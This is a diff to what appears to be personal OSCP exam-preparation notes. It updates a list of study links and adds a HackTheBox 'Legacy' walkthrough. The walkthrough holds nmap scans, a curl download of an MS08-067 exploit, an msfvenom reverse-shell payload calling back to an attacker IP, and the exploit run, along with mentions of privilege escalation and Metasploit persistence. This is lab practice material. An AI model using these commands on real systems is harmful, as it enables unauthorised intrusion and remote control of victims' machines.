@@ -4,11 +4,13 @@
 
 ## Pre-Prep
 ### Public resources
-[Offensive-Security Syllabus](https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf)
-[Official Exam Guide](https://support.offensive-security.com/oscp-exam-guide/)
-[How to prepare for PWK/OSCP, a noob-friendly guide](https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob)
-[https://xapax.gitbooks.io/security/content/](https://xapax.gitbooks.io/security/content/)
-[OSCP Goldmine](http://0xc0ffee.io/blog/OSCP-Goldmine)
+- [Offensive-Security Syllabus](https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf)
+- [Official Exam Guide](https://support.offensive-security.com/oscp-exam-guide/)
+- [How to prepare for PWK/OSCP, a noob-friendly guide](https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob)
+- [https://xapax.gitbooks.io/security/content/](https://xapax.gitbooks.io/security/content/)
+- [OSCP Goldmine](http://0xc0ffee.io/blog/OSCP-Goldmine)
+- [OSCP like boxes and VMs](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159)
+
 
 ### Other resources
 [TryHackMe](https://bit.ly/tryhackme)
@@ -1046,3 +1048,16 @@ Login to WP-Dashboard and RDP:
 
 Use the researched [CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388) to get Administrator priviledges.
 Finally, get persistence with Metasploit: `run persistence -X`
+
+### Day 15 - Kicking (off) HackTheBox
+
+#### Legacy
+```
+nmap -T4 -A -p- 10.10.10.4 -oN nmap.log -v
+nmap -p139,445,3389 -O 10.10.10.4 -v
+nmap -p445 --script smb-vuln-ms08-067 -Pn 10.10.10.4 -v
+
+curl https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py -o ms08-067.py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+python ms08-067.py 10.10.10.4 7 445
+```
